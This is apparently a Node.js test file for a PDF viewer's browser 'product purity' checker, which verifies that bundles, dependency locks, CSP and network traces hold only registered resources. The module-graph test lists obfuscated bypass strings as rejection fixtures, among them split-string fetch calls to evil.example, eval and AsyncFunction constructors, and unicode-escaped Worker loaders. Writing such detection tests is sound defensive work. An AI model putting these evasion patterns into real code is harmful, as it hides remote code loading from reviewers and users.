import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { cp, mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import test from "node:test";
import { fileURLToPath } from "node:url";

import {
  BrowserProductPurityError,
  canonicalJson,
  checkBrowserProductPurity,
  inspectProductCargoDependency,
  inspectProductModuleText,
  validateBrowserNetworkTrace,
  validateBrowserProductPolicy,
} from "../scripts/browser-product-purity.mjs";

const browserRoot = fileURLToPath(new URL("../", import.meta.url));
const repositoryRoot = fileURLToPath(new URL("../../../", import.meta.url));
const policyPath = join(browserRoot, "product/browser-product-policy.json");
const policy = JSON.parse(await readFile(policyPath, "utf8"));

const withBrowserFixture = async (callback) => {
  const temporary = await mkdtemp(join(tmpdir(), "pdf-rs-browser-purity-"));
  const fixture = join(temporary, "browser");
  try {
    for (const path of [
      "dist/native",
      "generated",
      "product",
      "src",
      "package-lock.json",
      "package.json",
    ]) {
      await cp(join(browserRoot, path), join(fixture, path), {
        recursive: true,
      });
    }
    return await callback(fixture);
  } finally {
    await rm(temporary, { force: true, recursive: true });
  }
};

test("canonical product closure binds every Native browser surface", async () => {
  assert.equal(validateBrowserProductPolicy(policy), true);
  const report = await checkBrowserProductPurity({ browserRoot });
  assert.equal(report.bundleFileCount, 3);
  assert.equal(report.moduleFileCount, policy.module_graph.files.length);
  assert.equal(report.shippedThirdPartyLeafCount, 0);
  assert.equal(report.wasmImportCount, 0);
  for (const digest of [
    report.bundleManifestSha256,
    report.moduleGraphSha256,
    report.networkManifestSha256,
    report.packageLockSha256,
    report.policySha256,
    report.precacheSha256,
    report.workerGraphSha256,
  ]) {
    assert.match(digest, /^[0-9a-f]{64}$/u);
  }
});

test("unregistered executable and Wasm payloads fail closed", async () => {
  await withBrowserFixture(async (fixture) => {
    await writeFile(join(fixture, "dist/native/second-engine.wasm"), new Uint8Array([0]));
    await assert.rejects(
      checkBrowserProductPurity({ browserRoot: fixture, repositoryRoot }),
      (error) =>
        error instanceof BrowserProductPurityError
        && error.code === "RPE-BROWSER-PURITY-0005",
    );
  });
});

test("dependency lock rejects an unregistered external engine leaf", async () => {
  await withBrowserFixture(async (fixture) => {
    const lockPath = join(fixture, "package-lock.json");
    const lock = JSON.parse(await readFile(lockPath, "utf8"));
    lock.packages["node_modules/pdfjs-dist"] = {
      dev: false,
      integrity: "sha512-unregistered",
      license: "Apache-2.0",
      resolved: "https://registry.npmjs.org/pdfjs-dist/-/pdfjs-dist-1.0.0.tgz",
      version: "1.0.0",
    };
    await writeFile(lockPath, `${JSON.stringify(lock, null, 2)}\n`);
    await assert.rejects(
      checkBrowserProductPurity({ browserRoot: fixture, repositoryRoot }),
      (error) =>
        error instanceof BrowserProductPurityError
        && error.code === "RPE-BROWSER-PURITY-0010",
    );
  });
});

test("Cargo and npm dependency edges are exact reviewed graphs", async () => {
  const cargoPolicy = structuredClone(policy);
  cargoPolicy.cargo_graph.packages.pop();
  assert.throws(
    () => validateBrowserProductPolicy(cargoPolicy),
    (error) =>
      error instanceof BrowserProductPurityError
      && error.code === "RPE-BROWSER-PURITY-0010",
  );
  await withBrowserFixture(async (fixture) => {
    const lockPath = join(fixture, "package-lock.json");
    const lock = JSON.parse(await readFile(lockPath, "utf8"));
    lock.packages["node_modules/@types/node"].dependencies.typescript = "5.9.3";
    await writeFile(lockPath, `${JSON.stringify(lock, null, 2)}\n`);
    await assert.rejects(
      checkBrowserProductPurity({ browserRoot: fixture, repositoryRoot }),
      (error) =>
        error instanceof BrowserProductPurityError
        && error.code === "RPE-BROWSER-PURITY-0010",
    );
  });
});

test("Cargo build and optional dependencies cannot bypass the product graph", () => {
  const known = new Set(["pdf-rs-bytes"]);
  assert.deepEqual(
    inspectProductCargoDependency({
      kind: "build",
      name: "pdf-rs-bytes",
      optional: false,
      source: null,
    }, known),
    { kind: "build", name: "pdf-rs-bytes" },
  );
  assert.equal(
    inspectProductCargoDependency({
      kind: "dev",
      name: "test-only-external",
      optional: false,
      source: "registry+https://github.com/rust-lang/crates.io-index",
    }, known),
    undefined,
  );
  assert.throws(
    () => inspectProductCargoDependency({
      kind: "build",
      name: "cc",
      optional: false,
      source: "registry+https://github.com/rust-lang/crates.io-index",
    }, known),
    (error) =>
      error instanceof BrowserProductPurityError
      && error.code === "RPE-BROWSER-PURITY-0010",
  );
  assert.throws(
    () => inspectProductCargoDependency({
      kind: null,
      name: "pdf-rs-bytes",
      optional: true,
      source: null,
    }, known),
    (error) =>
      error instanceof BrowserProductPurityError
      && error.code === "RPE-BROWSER-PURITY-0010",
  );
});

test("module graph rejects external engines and dynamic executable downloads", () => {
  assert.throws(
    () => inspectProductModuleText(
      "src/foreign.ts",
      'import engine from "pdfjs-dist";\n',
    ),
    (error) =>
      error instanceof BrowserProductPurityError
      && error.code === "RPE-BROWSER-PURITY-0003",
  );
  assert.throws(
    () => inspectProductModuleText(
      "src/foreign.ts",
      'await import("https://renderer.example/engine.js");\n',
    ),
    (error) =>
      error instanceof BrowserProductPurityError
      && error.code === "RPE-BROWSER-PURITY-0004",
  );
  assert.throws(
    () => inspectProductModuleText(
      "src/foreign.ts",
      "new Worker('./unregistered-worker.js', { type: 'module' });\n",
    ),
    (error) =>
      error instanceof BrowserProductPurityError
      && error.code === "RPE-BROWSER-PURITY-0008",
  );
  assert.throws(
    () => inspectProductModuleText(
      "src/foreign.ts",
      "importScripts('./unregistered-engine.js');\n",
    ),
    (error) =>
      error instanceof BrowserProductPurityError
      && error.code === "RPE-BROWSER-PURITY-0004",
  );
  assert.throws(
    () => inspectProductModuleText(
      "src/foreign.ts",
      "//# sourceMappingURL=foreign.js.map\n",
    ),
    (error) =>
      error instanceof BrowserProductPurityError
      && error.code === "RPE-BROWSER-PURITY-0005",
  );
  for (const bypass of [
    'const request = globalThis["fe" + "tch"]; request("ht" + "tps://evil.example/engine.wasm");\n',
    "const WorkerConstructor = Worker; new WorkerConstructor('./evil.js');\n",
    'navigator["service" + "Worker"].register("./evil.js");\n',
    'source.fetcher["fe" + "tch"]({ url: "selected-source:" });\n',
    'const execute = eval; execute("globalThis.fetch(\\"https://evil.example\\")");\n',
    'const AsyncFunction = (async () => {}).constructor; AsyncFunction("return fetch(\\"https://evil.example\\")")();\n',
    'const AsyncFunction = Reflect.get(async () => {}, "con\\u0073tructor");\n',
    'const WorkerConstructor = W\\u006frker; new WorkerConstructor("./evil.js");\n',
    'const left = "fe"; const right = "tch"; const request = global\\u0054his[left + right]; void request;\n',
    "const compile = WebAssembly.compile; void compile;\n",
    'const script = document.createElement("script"); script.src = "/evil.js";\n',
    'const marker = /`/; const HiddenWorker = Worker; new HiddenWorker("./evil.js"); const end = /`/;\n',
    "let counter = 1; counter++ / Worker / counter;\n",
    "let value: unknown = 1; value! / Worker / 1;\n",
    'const left = "con", right = "structor"; const DynamicFunction = Reflect.get(async () => {}, left + right);\n',
    'const left = "fe", right = "tch"; const request = source[left + right];\n',
    'const left = "Wor", right = "ker"; const DynamicWorker = source[left + right];\n',
    'const url = `ht${"tps://evil.example/engine.wasm"}`;\n',
    'const name = `fe${"tch"}`;\n',
    'const left = "con"\nconst right = "structor"\nconst key = left + right;\n',
    '{ const left = "con", right = "structor"; const DynamicFunction = Reflect.get(async () => {}, left + right); } { const left = "safe", right = "value"; }\n',
    'let left = "con", right = "structor"; const DynamicFunction = Reflect.get(async () => {}, left + right);\n',
    'let left = "fe", right = "tch"; source?.[left + right]?.();\n',
    'let left = "fe", right = "tch"; const request = source![left + right]; request();\n',
    'const parts = ["con", "structor"]; const key = parts.join(""); const DynamicFunction = Reflect.get(async () => {}, key);\n',
    'import/* comment-separated */ engine from "foreign-engine"; void engine;\n',
  ]) {
    assert.throws(
      () => inspectProductModuleText("src/foreign.ts", bypass),
      (error) =>
        error instanceof BrowserProductPurityError
        && [
          "RPE-BROWSER-PURITY-0004",
          "RPE-BROWSER-PURITY-0006",
          "RPE-BROWSER-PURITY-0008",
          "RPE-BROWSER-PURITY-0009",
        ]
          .includes(error.code),
    );
  }
  assert.deepEqual(
    inspectProductModuleText(
      "src/foreign.ts",
      'import/* reviewed comment */ { value } from "./local.js";\n',
    ),
    ["./local.js"],
  );
  assert.deepEqual(
    inspectProductModuleText(
      "src/foreign.ts",
      [
        "const pattern = /[`]/u;",
        "const label = `safe-${String(pattern)}`;",
        "// Worker, globalThis, and fetch are inert in comments.",
        'const literal = "Worker globalThis fetch";',
        "void label; void literal;",
        "",
      ].join("\n"),
    ),
    [],
  );
});

test("CSP and service Worker precache are closed canonical registries", async () => {
  await withBrowserFixture(async (fixture) => {
    const mutated = structuredClone(policy);
    mutated.csp["connect-src"].push("https://renderer.example");
    await writeFile(
      join(fixture, "product/browser-product-policy.json"),
      canonicalJson(mutated),
    );
    await assert.rejects(
      checkBrowserProductPurity({ browserRoot: fixture, repositoryRoot }),
      (error) =>
        error instanceof BrowserProductPurityError
        && error.code === "RPE-BROWSER-PURITY-0007",
    );
  });
  await withBrowserFixture(async (fixture) => {
    const mutated = structuredClone(policy);
    mutated.service_worker.precache.push("./native/second-engine.wasm");
    await writeFile(
      join(fixture, "product/browser-product-policy.json"),
      canonicalJson(mutated),
    );
    await assert.rejects(
      checkBrowserProductPurity({ browserRoot: fixture, repositoryRoot }),
      (error) =>
        error instanceof BrowserProductPurityError
        && error.code === "RPE-BROWSER-PURITY-0008",
    );
  });
});

test("network trace binds exact product and selected-source identities", () => {
  const productBaseUrl = "https://viewer.example/";
  const selectedSource = {
    length: 8192,
    revision: "7",
    stable_id: "01".repeat(32),
    url: "https://documents.example/report.pdf",
    validator_sha256: "02".repeat(32),
  };
  const options = {
    productBaseUrl,
    selectedSource,
  };
  const selectedSourceIdentity = createHash("sha256")
    .update(canonicalJson(selectedSource), "utf8")
    .digest("hex");
  const viewerModuleUrls = policy.module_graph.files.map((path) =>
    new URL(path.replace(/\.ts$/u, ".js"), productBaseUrl).href
  );
  const nativeWorker = policy.resources.find(
    (resource) =>
      resource.path === "dist/native/engine-worker.generated.js",
  );
  const nativeWasm = policy.resources.find(
    (resource) => resource.path === "dist/native/engine.wasm",
  );
  const trace = [
    ...viewerModuleUrls.map((url) => ({
      bytes: 2048,
      identity: policy.module_graph.sha256,
      resource_id: "viewer-module-graph",
      url,
    })),
    {
      bytes: nativeWorker.byte_length,
      identity: nativeWorker.sha256,
      resource_id: "native-worker-entry",
      url: `${productBaseUrl}native/engine-worker.generated.js`,
    },
    {
      bytes: nativeWasm.byte_length,
      identity: nativeWasm.sha256,
      resource_id: "native-wasm",
      url: `${productBaseUrl}native/engine.wasm`,
    },
    {
      bytes: 1024,
      identity: selectedSourceIdentity,
      resource_id: "selected-source",
      url: selectedSource.url,
    },
    {
      bytes: 1024,
      identity: selectedSourceIdentity,
      resource_id: "selected-source",
      url: selectedSource.url,
    },
  ];
  assert.deepEqual(
    validateBrowserNetworkTrace(policy, trace, options),
    { requestCount: viewerModuleUrls.length + 4, resourceCount: 4 },
  );
  const crossedOrigin = structuredClone(trace);
  const wasmIndex = crossedOrigin.findIndex(
    (entry) => entry.resource_id === "native-wasm",
  );
  crossedOrigin[wasmIndex].url = "https://evil.example/native/engine.wasm";
  assert.throws(
    () => validateBrowserNetworkTrace(policy, crossedOrigin, options),
    (error) =>
      error instanceof BrowserProductPurityError
      && error.code === "RPE-BROWSER-PURITY-0009",
  );
  for (const invalid of [
    [],
    trace.filter((entry) => entry.resource_id !== "native-wasm"),
    trace.map((entry, index) => index === 0 ? { ...entry, bytes: 0 } : entry),
    trace.map((entry, index) => index === 2
      ? {
          ...entry,
          url: "https://viewer.example/unregistered/evil.js?loader=foreign",
        }
      : entry),
    trace.map((entry, index) => index === wasmIndex
      ? { ...entry, resource_id: "selected-source" }
      : entry),
    trace.map((entry, index) => index === wasmIndex
      ? { ...entry, bytes: 1 }
      : entry),
    trace.map((entry, index) => index === wasmIndex
      ? { ...entry, identity: selectedSourceIdentity }
      : entry),
    trace.filter((entry, index) => index !== 1),
  ]) {
    assert.throws(
      () => validateBrowserNetworkTrace(policy, invalid, options),
      (error) =>
        error instanceof BrowserProductPurityError
        && error.code === "RPE-BROWSER-PURITY-0009",
    );
  }

  const drifted = structuredClone(policy);
  drifted.network_manifest[0].location = "./evil/engine.wasm";
  assert.throws(
    () => validateBrowserProductPolicy(drifted),
    (error) =>
      error instanceof BrowserProductPurityError
      && error.code === "RPE-BROWSER-PURITY-0009",
  );
  assert.throws(
    () => validateBrowserNetworkTrace(policy, trace, {
      productBaseUrl,
      selectedSource: {
        ...selectedSource,
        stable_id: "00".repeat(32),
      },
    }),
    (error) =>
      error instanceof BrowserProductPurityError
      && error.code === "RPE-BROWSER-PURITY-0009",
  );
});
